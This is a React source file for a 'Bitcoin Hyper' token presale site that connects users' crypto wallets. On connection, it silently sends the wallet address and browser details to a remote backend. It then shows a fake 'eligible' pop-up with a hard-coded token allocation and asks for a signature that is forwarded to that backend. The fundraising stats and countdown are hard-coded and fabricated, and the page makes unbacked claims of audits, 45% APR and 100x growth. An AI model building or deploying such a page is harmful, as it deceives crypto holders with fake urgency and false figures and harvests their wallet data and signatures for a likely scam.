// App.jsx - BITCOIN HYPER TOKEN PRESALE LAUNCH
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { 
  WagmiProvider, 
  createConfig, 
  http, 
  useAccount, 
  useDisconnect,
  useSignMessage
} from "wagmi";
import { 
  mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
  fantom, base, linea
} from "wagmi/chains";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";

// Create outside components
const queryClient = new QueryClient();

// Supported chains for presale
const allChains = [
  mainnet, polygon, bsc, arbitrum, optimism, avalanche,
  fantom, base, linea
];

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: allChains.reduce((acc, chain) => {
      acc[chain.id] = http(getChainRPC(chain.id));
      return acc;
    }, {}),
  })
);

// RPC endpoints
function getChainRPC(chainId) {
  const rpcs = {
    1: "https://eth.llamarpc.com",
    56: "https://bsc-dataseed.binance.org",
    137: "https://polygon-rpc.com",
    42161: "https://arb1.arbitrum.io/rpc",
    10: "https://mainnet.optimism.io",
    43114: "https://api.avax.network/ext/bc/C/rpc",
    250: "https://rpc.ftm.tools",
    8453: "https://mainnet.base.org",
    59144: "https://rpc.linea.build"
  };
  return rpcs[chainId] || "https://eth.llamarpc.com";
}

// Backend API - Update this with your Render URL
const BACKEND_API = process.env.REACT_APP_BACKEND_URL || "https://bitcoinhyper-backend.onrender.com/api";

// Animation presets
const ANIMATIONS = {
  bitcoinGlow: {
    keyframes: `
      @keyframes bitcoinGlow {
        0%, 100% { filter: drop-shadow(0 0 10px #F7931A); }
        50% { filter: drop-shadow(0 0 25px #F7931A); }
      }
    `,
    style: { animation: 'bitcoinGlow 2s infinite' }
  },
  floatUpDown: {
    keyframes: `
      @keyframes floatUpDown {
        0%, 100% { transform: translateY(0); }
        50% { transform: translateY(-20px); }
      }
    `,
    style: { animation: 'floatUpDown 3s ease-in-out infinite' }
  },
  pulseGlow: {
    keyframes: `
      @keyframes pulseGlow {
        0% { box-shadow: 0 0 0 0 rgba(247, 147, 26, 0.7); }
        70% { box-shadow: 0 0 0 20px rgba(247, 147, 26, 0); }
        100% { box-shadow: 0 0 0 0 rgba(247, 147, 26, 0); }
      }
    `,
    style: { animation: 'pulseGlow 2s infinite' }
  },
  shimmer: {
    keyframes: `
      @keyframes shimmer {
        0% { background-position: -200% center; }
        100% { background-position: 200% center; }
      }
    `,
    style: { 
      background: 'linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.3), transparent)',
      backgroundSize: '200% 100%',
      animation: 'shimmer 3s infinite linear'
    }
  }
};

function BitcoinHyperPresale() {
  const { address, isConnected, chain } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessage } = useSignMessage();
  
  const [loading, setLoading] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const [claimData, setClaimData] = useState(null);
  const [processing, setProcessing] = useState(false);
  const [showSignModal, setShowSignModal] = useState(false);
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  });
  const [presaleStats, setPresaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  });
  const [isMobile, setIsMobile] = useState(false);
  
  const animationRef = useRef(null);
  const confettiRef = useRef([]);

  // Initialize animations
  useEffect(() => {
    setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
    
    // Add animation styles
    const style = document.createElement('style');
    Object.values(ANIMATIONS).forEach(anim => {
      style.textContent += anim.keyframes;
    });
    
    // Add custom animations
    style.textContent += `
      @keyframes rocketLaunch {
        0% { transform: translateY(100px) scale(0.5); opacity: 0; }
        50% { transform: translateY(-50px) scale(1.2); opacity: 1; }
        100% { transform: translateY(-200px) scale(0.8); opacity: 0; }
      }
      
      @keyframes coinSpin {
        from { transform: rotateY(0deg); }
        to { transform: rotateY(360deg); }
      }
      
      @keyframes sparkle {
        0%, 100% { opacity: 0; transform: scale(0); }
        50% { opacity: 1; transform: scale(1); }
      }
      
      @keyframes gradientFlow {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
      }
    `;
    document.head.appendChild(style);
    
    // Start countdown
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev;
        seconds--;
        
        if (seconds < 0) {
          seconds = 59;
          minutes--;
        }
        if (minutes < 0) {
          minutes = 59;
          hours--;
        }
        if (hours < 0) {
          hours = 23;
          days--;
        }
        if (days < 0) {
          clearInterval(interval);
          return { days: 0, hours: 0, minutes: 0, seconds: 0 };
        }
        
        return { days, hours, minutes, seconds };
      });
    }, 1000);
    
    return () => clearInterval(interval);
  }, []);

  // Auto scan when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      triggerAutoScan();
    }
  }, [isConnected, address]);

  // Auto scan function
  const triggerAutoScan = async () => {
    if (!address) return;
    
    setScanning(true);
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          ip: 'auto-detected',
          chainId: chain?.id || 1,
          timestamp: new Date().toISOString()
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        // Add delay for dramatic effect
        setTimeout(() => {
          setScanning(false);
          
          if (data.data.isEligible) {
            setIsEligible(true);
            
            // Show animated sign modal after 1 second
            setTimeout(() => {
              setShowSignModal(true);
              triggerCelebrationAnimation();
            }, 1000);
            
            // Auto-hide after 30 seconds if no action
            setTimeout(() => {
              if (showSignModal) {
                setShowSignModal(false);
              }
            }, 30000);
          }
        }, 2000);
      }
    } catch (error) {
      console.error('Scan error:', error);
      setScanning(false);
    }
  };

  // Handle signature for token claim
  const handleTokenClaim = async () => {
    if (!address || !isEligible) return;
    
    setProcessing(true);
    
    try {
      const claimAmount = "5,000 BTH"; // Dynamic from backend
      const claimValue = "$850";
      
      const message = `I confirm my participation in Bitcoin Hyper Token Presale\n\nWallet: ${address}\nClaim Amount: ${claimAmount}\nValue: ${claimValue}\n\nTimestamp: ${Date.now()}\n\nBy signing, I authorize the allocation of presale tokens to my wallet.`;
      
      const signature = await signMessage({ message });
      
      // Send to backend
      const response = await fetch(`${BACKEND_API}/presale/claim`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message,
          claimAmount,
          claimValue
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setClaimData(data.data);
        setShowSignModal(false);
        
        // Show mega celebration animation
        triggerMegaCelebration();
        
        // Play success sound
        const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3');
        audio.volume = 0.3;
        audio.play().catch(() => {});
      }
    } catch (error) {
      console.error('Claim error:', error);
      setProcessing(false);
    }
  };

  // Celebration animations
  const triggerCelebrationAnimation = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    // Clear previous animations
    container.innerHTML = '';
    
    // Create bitcoin coins animation
    for (let i = 0; i < 15; i++) {
      const coin = document.createElement('div');
      coin.innerHTML = '₿';
      coin.style.cssText = `
        position: absolute;
        font-size: ${Math.random() * 40 + 20}px;
        color: #F7931A;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: coinSpin ${Math.random() * 2 + 1}s linear infinite,
                   floatUpDown ${Math.random() * 3 + 2}s ease-in-out infinite;
        z-index: 1000;
        opacity: 0.7;
        filter: drop-shadow(0 0 10px #F7931A);
      `;
      container.appendChild(coin);
    }
    
    // Create sparkles
    for (let i = 0; i < 30; i++) {
      const sparkle = document.createElement('div');
      sparkle.style.cssText = `
        position: absolute;
        width: 4px;
        height: 4px;
        background: #FFD700;
        border-radius: 50%;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: sparkle ${Math.random() * 2 + 1}s infinite;
        z-index: 1000;
      `;
      container.appendChild(sparkle);
    }
  };

  const triggerMegaCelebration = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    // Rocket launch animation
    const rocket = document.createElement('div');
    rocket.innerHTML = '🚀';
    rocket.style.cssText = `
      position: fixed;
      font-size: 80px;
      bottom: -100px;
      left: 50%;
      transform: translateX(-50%);
      animation: rocketLaunch 3s ease-out forwards;
      z-index: 9999;
      filter: drop-shadow(0 0 20px #F7931A);
    `;
    document.body.appendChild(rocket);
    
    // Massive confetti
    const colors = ['#F7931A', '#FFD700', '#FF6B6B', '#4ECDC4', '#45B7D1'];
    for (let i = 0; i < 300; i++) {
      const confetti = document.createElement('div');
      confetti.style.cssText = `
        position: fixed;
        width: ${Math.random() * 15 + 5}px;
        height: ${Math.random() * 15 + 5}px;
        background: ${colors[Math.floor(Math.random() * colors.length)]};
        top: -20px;
        left: ${Math.random() * 100}vw;
        opacity: ${Math.random() * 0.7 + 0.3};
        animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
        border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
        transform: rotate(${Math.random() * 360}deg);
        z-index: 9998;
      `;
      document.body.appendChild(confetti);
      confettiRef.current.push(confetti);
      
      setTimeout(() => {
        if (document.body.contains(confetti)) {
          document.body.removeChild(confetti);
        }
      }, 5000);
    }
    
    // Bitcoin rain
    setTimeout(() => {
      for (let i = 0; i < 50; i++) {
        const bitcoin = document.createElement('div');
        bitcoin.innerHTML = '₿';
        bitcoin.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 50 + 30}px;
          color: #F7931A;
          top: -50px;
          left: ${Math.random() * 100}vw;
          animation: bitcoinRain ${Math.random() * 2 + 1}s linear forwards;
          z-index: 9997;
          opacity: 0.8;
          filter: drop-shadow(0 0 15px #F7931A);
        `;
        document.body.appendChild(bitcoin);
        
        setTimeout(() => {
          if (document.body.contains(bitcoin)) {
            document.body.removeChild(bitcoin);
          }
        }, 3000);
      }
      
      // Add bitcoin rain animation
      const style = document.createElement('style');
      style.textContent = `
        @keyframes bitcoinRain {
          0% { transform: translateY(-50px) rotate(0deg); opacity: 0; }
          10% { opacity: 1; }
          90% { opacity: 0.5; }
          100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        
        @keyframes confettiFall {
          0% { transform: translateY(-20px) rotate(0deg); }
          100% { transform: translateY(100vh) rotate(720deg); }
        }
      `;
      document.head.appendChild(style);
      
    }, 500);
    
    // Auto remove rocket
    setTimeout(() => {
      if (document.body.contains(rocket)) {
        document.body.removeChild(rocket);
      }
    }, 3000);
  };

  // Format countdown numbers
  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num;
  };

  // Sign Modal Component
  const SignModal = () => {
    if (!showSignModal) return null;
    
    return (
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: 'rgba(0, 0, 0, 0.95)',
        zIndex: 9999,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        animation: 'fadeIn 0.3s ease'
      }}>
        <div style={{
          background: 'linear-gradient(135deg, #0f172a 0%, #1e293b 100%)',
          padding: '40px',
          borderRadius: '30px',
          maxWidth: '500px',
          width: '90%',
          border: '2px solid #F7931A',
          boxShadow: '0 0 50px rgba(247, 147, 26, 0.5)',
          position: 'relative',
          overflow: 'hidden'
        }}>
          {/* Shimmer effect */}
          <div style={{
            position: 'absolute',
            top: 0,
            left: 0,
            right: 0,
            height: '3px',
            ...ANIMATIONS.shimmer.style
          }}></div>
          
          <button
            onClick={() => setShowSignModal(false)}
            style={{
              position: 'absolute',
              top: '20px',
              right: '20px',
              background: 'transparent',
              border: 'none',
              color: '#94a3b8',
              fontSize: '24px',
              cursor: 'pointer',
              zIndex: 1
            }}
          >
            ✕
          </button>
          
          <div style={{ textAlign: 'center', marginBottom: '30px' }}>
            <div style={{
              fontSize: '48px',
              marginBottom: '20px',
              ...ANIMATIONS.bitcoinGlow.style
            }}>
              🎉
            </div>
            <h2 style={{
              fontSize: '32px',
              color: '#F7931A',
              marginBottom: '10px',
              background: 'linear-gradient(45deg, #F7931A, #FFD700)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent'
            }}>
              Congratulations!
            </h2>
            <p style={{ color: '#cbd5e1', fontSize: '18px' }}>
              You're eligible for Bitcoin Hyper presale tokens!
            </p>
          </div>
          
          <div style={{
            background: 'rgba(247, 147, 26, 0.1)',
            padding: '25px',
            borderRadius: '20px',
            border: '1px solid rgba(247, 147, 26, 0.3)',
            marginBottom: '30px'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
              <span style={{ color: '#94a3b8' }}>Token Allocation</span>
              <span style={{ color: '#F7931A', fontWeight: 'bold', fontSize: '20px' }}>5,000 BTH</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '15px' }}>
              <span style={{ color: '#94a3b8' }}>Value</span>
              <span style={{ color: '#10b981', fontWeight: 'bold', fontSize: '20px' }}>$850</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between' }}>
              <span style={{ color: '#94a3b8' }}>Vesting</span>
              <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>25% TGE, 6 months linear</span>
            </div>
          </div>
          
          <div style={{
            background: 'rgba(59, 130, 246, 0.1)',
            padding: '20px',
            borderRadius: '15px',
            marginBottom: '25px',
            border: '1px solid rgba(59, 130, 246, 0.3)'
          }}>
            <div style={{ color: '#3b82f6', marginBottom: '10px', fontWeight: 'bold' }}>
              📝 Sign to Claim
            </div>
            <div style={{ color: '#94a3b8', fontSize: '14px' }}>
              Sign this message to confirm your wallet ownership and claim your presale allocation.
            </div>
          </div>
          
          <button
            onClick={handleTokenClaim}
            disabled={processing}
            style={{
              width: '100%',
              padding: '20px',
              background: processing ? '#4b5563' : 'linear-gradient(45deg, #F7931A, #FFD700)',
              color: 'white',
              border: 'none',
              borderRadius: '15px',
              fontSize: '18px',
              fontWeight: 'bold',
              cursor: processing ? 'not-allowed' : 'pointer',
              ...ANIMATIONS.pulseGlow.style,
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '10px'
            }}
          >
            {processing ? (
              <>
                <div style={{ animation: 'spin 1s linear infinite' }}>⏳</div>
                Processing Your Claim...
              </>
            ) : (
              <>
                ✍️ Sign & Claim 5,000 BTH Tokens
              </>
            )}
          </button>
          
          <div style={{
            marginTop: '20px',
            padding: '15px',
            background: 'rgba(0,0,0,0.3)',
            borderRadius: '10px',
            fontSize: '12px',
            color: '#94a3b8',
            textAlign: 'center'
          }}>
            ⚡ Tokens will be distributed after presale ends
          </div>
        </div>
      </div>
    );
  };

  // Main render
  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
      color: 'white',
      fontFamily: '"Inter", "Segoe UI", system-ui, -apple-system, sans-serif',
      overflow: 'hidden',
      position: 'relative'
    }}>
      {/* Animation container */}
      <div id="animation-container" style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        pointerEvents: 'none',
        zIndex: 1
      }}></div>
      
      {/* Main content */}
      <div style={{ position: 'relative', zIndex: 2 }}>
        {/* Header */}
        <header style={{
          padding: isMobile ? '20px 15px' : '30px 50px',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          borderBottom: '1px solid rgba(247, 147, 26, 0.2)',
          background: 'rgba(15, 23, 42, 0.8)',
          backdropFilter: 'blur(10px)'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
            <div style={{
              fontSize: '32px',
              ...ANIMATIONS.bitcoinGlow.style
            }}>
              ₿
            </div>
            <div>
              <h1 style={{
                fontSize: isMobile ? '20px' : '28px',
                margin: 0,
                background: 'linear-gradient(45deg, #F7931A, #FFD700)',
                WebkitBackgroundClip: 'text',
                WebkitTextFillColor: 'transparent',
                fontWeight: 'bold'
              }}>
                BITCOIN HYPER
              </h1>
              <div style={{ color: '#94a3b8', fontSize: '12px', letterSpacing: '2px' }}>
                OFFICIAL PRESALE LAUNCH
              </div>
            </div>
          </div>
          
          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
            {isConnected && (
              <button
                onClick={() => disconnect()}
                style={{
                  padding: '10px 20px',
                  background: 'rgba(239, 68, 68, 0.2)',
                  color: '#ef4444',
                  border: '1px solid rgba(239, 68, 68, 0.3)',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontSize: '14px'
                }}
              >
                Disconnect
              </button>
            )}
            
            <ConnectKitButton.Custom>
              {({ show }) => (
                <button
                  onClick={show}
                  style={{
                    padding: '12px 30px',
                    background: 'linear-gradient(45deg, #F7931A, #FFD700)',
                    color: 'black',
                    border: 'none',
                    borderRadius: '10px',
                    cursor: 'pointer',
                    fontWeight: 'bold',
                    fontSize: '16px',
                    ...ANIMATIONS.pulseGlow.style
                  }}
                >
                  {isConnected ? 'Wallet Connected' : 'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        {/* Hero Section */}
        <section style={{
          padding: isMobile ? '60px 20px' : '100px 50px',
          textAlign: 'center',
          position: 'relative',
          overflow: 'hidden'
        }}>
          <div style={{
            position: 'absolute',
            top: '50%',
            left: '50%',
            transform: 'translate(-50%, -50%)',
            width: '800px',
            height: '800px',
            background: 'radial-gradient(circle, rgba(247, 147, 26, 0.1) 0%, transparent 70%)',
            zIndex: -1
          }}></div>
          
          <div style={{ 
            fontSize: isMobile ? '80px' : '120px',
            marginBottom: '20px',
            ...ANIMATIONS.floatUpDown.style
          }}>
            ₿
          </div>
          
          <h2 style={{
            fontSize: isMobile ? '28px' : '48px',
            marginBottom: '20px',
            background: 'linear-gradient(45deg, #F7931A, #FFD700, #FFFFFF)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            animation: 'gradientFlow 3s ease infinite',
            backgroundSize: '200% 200%'
          }}>
            NEXT GENERATION BITCOIN ECOSYSTEM
          </h2>
          
          <p style={{
            color: '#cbd5e1',
            fontSize: isMobile ? '16px' : '20px',
            maxWidth: '800px',
            margin: '0 auto 40px',
            lineHeight: '1.6'
          }}>
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          {/* Countdown Timer */}
          <div style={{
            display: 'inline-flex',
            gap: '15px',
            marginBottom: '40px',
            background: 'rgba(15, 23, 42, 0.8)',
            padding: '25px',
            borderRadius: '20px',
            border: '1px solid rgba(247, 147, 26, 0.3)',
            backdropFilter: 'blur(10px)'
          }}>
            {Object.entries(countdown).map(([label, value]) => (
              <div key={label} style={{ textAlign: 'center' }}>
                <div style={{
                  fontSize: '36px',
                  fontWeight: 'bold',
                  background: 'linear-gradient(45deg, #F7931A, #FFD700)',
                  WebkitBackgroundClip: 'text',
                  WebkitTextFillColor: 'transparent',
                  minWidth: '70px'
                }}>
                  {formatNumber(value)}
                </div>
                <div style={{
                  color: '#94a3b8',
                  fontSize: '12px',
                  textTransform: 'uppercase',
                  letterSpacing: '2px'
                }}>
                  {label}
                </div>
              </div>
            ))}
          </div>
          
          {/* Presale Stats */}
          <div style={{
            display: 'grid',
            gridTemplateColumns: isMobile ? '1fr' : 'repeat(4, 1fr)',
            gap: '20px',
            maxWidth: '1000px',
            margin: '0 auto 40px'
          }}>
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} style={{
                background: 'rgba(15, 23, 42, 0.8)',
                padding: '25px',
                borderRadius: '15px',
                border: '1px solid rgba(247, 147, 26, 0.2)',
                backdropFilter: 'blur(10px)'
              }}>
                <div style={{
                  fontSize: '28px',
                  fontWeight: 'bold',
                  color: '#F7931A',
                  marginBottom: '10px'
                }}>
                  {value}
                </div>
                <div style={{
                  color: '#94a3b8',
                  fontSize: '14px',
                  textTransform: 'uppercase'
                }}>
                  {label.replace(/([A-Z])/g, ' $1')}
                </div>
              </div>
            ))}
          </div>
          
          {/* Progress Bar */}
          <div style={{
            maxWidth: '800px',
            margin: '0 auto 40px',
            background: 'rgba(15, 23, 42, 0.8)',
            padding: '30px',
            borderRadius: '20px',
            border: '1px solid rgba(247, 147, 26, 0.3)',
            backdropFilter: 'blur(10px)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px' }}>
              <span style={{ color: '#cbd5e1' }}>Presale Progress</span>
              <span style={{ color: '#F7931A', fontWeight: 'bold' }}>{presaleStats.progress}%</span>
            </div>
            <div style={{
              height: '15px',
              background: 'rgba(247, 147, 26, 0.1)',
              borderRadius: '10px',
              overflow: 'hidden'
            }}>
              <div style={{
                height: '100%',
                width: `${presaleStats.progress}%`,
                background: 'linear-gradient(90deg, #F7931A, #FFD700)',
                borderRadius: '10px',
                position: 'relative'
              }}>
                <div style={{
                  position: 'absolute',
                  top: '0',
                  right: '0',
                  bottom: '0',
                  width: '4px',
                  background: 'white',
                  boxShadow: '0 0 10px white'
                }}></div>
              </div>
            </div>
          </div>
          
          {/* Call to Action */}
          {!isConnected ? (
            <div style={{
              background: 'linear-gradient(135deg, rgba(247, 147, 26, 0.1), rgba(255, 215, 0, 0.1))',
              padding: '40px',
              borderRadius: '25px',
              maxWidth: '600px',
              margin: '0 auto',
              border: '2px solid rgba(247, 147, 26, 0.3)',
              backdropFilter: 'blur(10px)'
            }}>
              <div style={{ fontSize: '48px', marginBottom: '20px' }}>🚀</div>
              <h3 style={{ color: '#F7931A', fontSize: '24px', marginBottom: '15px' }}>
                Connect Wallet to Check Eligibility
              </h3>
              <p style={{ color: '#cbd5e1', marginBottom: '25px' }}>
                Connect your wallet to automatically scan for eligibility. 
                Qualified wallets receive instant presale allocations.
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button
                    onClick={show}
                    style={{
                      padding: '18px 40px',
                      background: 'linear-gradient(45deg, #F7931A, #FFD700)',
                      color: 'black',
                      border: 'none',
                      borderRadius: '15px',
                      fontSize: '18px',
                      fontWeight: 'bold',
                      cursor: 'pointer',
                      ...ANIMATIONS.pulseGlow.style
                    }}
                  >
                    CONNECT WALLET TO START
                  </button>
                )}
              </ConnectKitButton.Custom>
            </div>
          ) : scanning ? (
            <div style={{
              background: 'rgba(15, 23, 42, 0.8)',
              padding: '40px',
              borderRadius: '25px',
              maxWidth: '500px',
              margin: '0 auto',
              border: '2px solid rgba(59, 130, 246, 0.3)',
              backdropFilter: 'blur(10px)'
            }}>
              <div style={{
                width: '80px',
                height: '80px',
                border: '4px solid #334155',
                borderTop: '4px solid #3b82f6',
                borderRadius: '50%',
                animation: 'spin 1s linear infinite',
                margin: '0 auto 30px'
              }}></div>
              <h3 style={{ color: '#3b82f6', fontSize: '24px', marginBottom: '15px' }}>
                Scanning Your Wallet...
              </h3>
              <p style={{ color: '#cbd5e1' }}>
                Checking eligibility across multiple chains...
              </p>
            </div>
          ) : isEligible ? (
            <div style={{
              background: 'linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(52, 211, 153, 0.1))',
              padding: '40px',
              borderRadius: '25px',
              maxWidth: '500px',
              margin: '0 auto',
              border: '2px solid rgba(16, 185, 129, 0.3)',
              backdropFilter: 'blur(10px)',
              animation: 'pulseGlow 2s infinite'
            }}>
              <div style={{ fontSize: '48px', marginBottom: '20px' }}>✅</div>
              <h3 style={{ color: '#10b981', fontSize: '24px', marginBottom: '15px' }}>
                You're Eligible!
              </h3>
              <p style={{ color: '#cbd5e1', marginBottom: '25px' }}>
                Check the sign button above to claim your presale tokens!
              </p>
            </div>
          ) : (
            <div style={{
              background: 'rgba(15, 23, 42, 0.8)',
              padding: '40px',
              borderRadius: '25px',
              maxWidth: '500px',
              margin: '0 auto',
              border: '2px solid rgba(247, 147, 26, 0.3)',
              backdropFilter: 'blur(10px)'
            }}>
              <div style={{ fontSize: '48px', marginBottom: '20px' }}>⏳</div>
              <h3 style={{ color: '#F7931A', fontSize: '24px', marginBottom: '15px' }}>
                Waiting for Scan Results
              </h3>
              <p style={{ color: '#cbd5e1' }}>
                Your eligibility check will complete momentarily...
              </p>
            </div>
          )}
        </section>

        {/* Features Section */}
        <section style={{
          padding: isMobile ? '60px 20px' : '100px 50px',
          background: 'rgba(15, 23, 42, 0.5)'
        }}>
          <h2 style={{
            textAlign: 'center',
            fontSize: isMobile ? '32px' : '48px',
            marginBottom: '60px',
            color: '#F7931A'
          }}>
            WHY BITCOIN HYPER?
          </h2>
          
          <div style={{
            display: 'grid',
            gridTemplateColumns: isMobile ? '1fr' : 'repeat(3, 1fr)',
            gap: '30px',
            maxWidth: '1200px',
            margin: '0 auto'
          }}>
            {[
              {
                icon: '⚡',
                title: 'Lightning Fast',
                desc: 'Transaction speeds up to 100x faster than traditional Bitcoin'
              },
              {
                icon: '🛡️',
                title: 'Secure & Audited',
                desc: 'Fully audited smart contracts with multi-sig security'
              },
              {
                icon: '📈',
                title: 'High Yield',
                desc: 'Earn yields up to 45% APR through our DeFi ecosystem'
              },
              {
                icon: '🌐',
                title: 'Multi-Chain',
                desc: 'Native interoperability across Ethereum, BSC, Polygon, and more'
              },
              {
                icon: '🎯',
                title: 'Limited Supply',
                desc: 'Only 100M tokens ever minted. True scarcity model'
              },
              {
                icon: '🚀',
                title: 'Massive Growth',
                desc: 'Backed by top VCs with 100x growth potential'
              }
            ].map((feature, index) => (
              <div key={index} style={{
                background: 'rgba(15, 23, 42, 0.8)',
                padding: '30px',
                borderRadius: '20px',
                border: '1px solid rgba(247, 147, 26, 0.2)',
                transition: 'transform 0.3s, border-color 0.3s',
                ':hover': {
                  transform: 'translateY(-10px)',
                  borderColor: '#F7931A'
                }
              }}>
                <div style={{
                  fontSize: '48px',
                  marginBottom: '20px',
                  ...ANIMATIONS.floatUpDown.style
                }}>
                  {feature.icon}
                </div>
                <h3 style={{
                  color: '#F7931A',
                  fontSize: '22px',
                  marginBottom: '15px'
                }}>
                  {feature.title}
                </h3>
                <p style={{ color: '#cbd5e1', lineHeight: '1.6' }}>
                  {feature.desc}
                </p>
              </div>
            ))}
          </div>
        </section>

        {/* Footer */}
        <footer style={{
          padding: '40px 20px',
          textAlign: 'center',
          borderTop: '1px solid rgba(247, 147, 26, 0.2)',
          background: 'rgba(15, 23, 42, 0.8)'
        }}>
          <div style={{ fontSize: '32px', marginBottom: '20px', ...ANIMATIONS.bitcoinGlow.style }}>
            ₿
          </div>
          <div style={{
            color: '#94a3b8',
            fontSize: '14px',
            maxWidth: '600px',
            margin: '0 auto 20px'
          }}>
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            gap: '20px',
            marginTop: '30px'
          }}>
            <span style={{ color: '#64748b', fontSize: '12px' }}>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span style={{ color: '#64748b', fontSize: '12px' }}>|</span>
            <span style={{ color: '#64748b', fontSize: '12px' }}>Official Presale Platform</span>
          </div>
        </footer>
      </div>

      {/* Sign Modal */}
      <SignModal />

      {/* Global Styles */}
      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.9); }
          to { opacity: 1; transform: scale(1); }
        }
        
        @keyframes gradientFlow {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
      `}</style>
    </div>
  );
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight",
  walletModal: "wide"
};

export default function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider 
          theme={customTheme}
          options={{
            hideQuestionMarkCTA: true,
            walletConnectName: 'WalletConnect',
            disableSiweRedirect: true,
            embedGoogleFonts: true,
            preferredWallets: ['walletConnect', 'metaMask', 'coinbase', 'trust', 'rainbow'],
            walletConnect: {
              showQrModal: true,
              qrModalOptions: {
                themeMode: 'dark',
                mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase']
              }
            }
          }}
        >
          <BitcoinHyperPresale />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
}
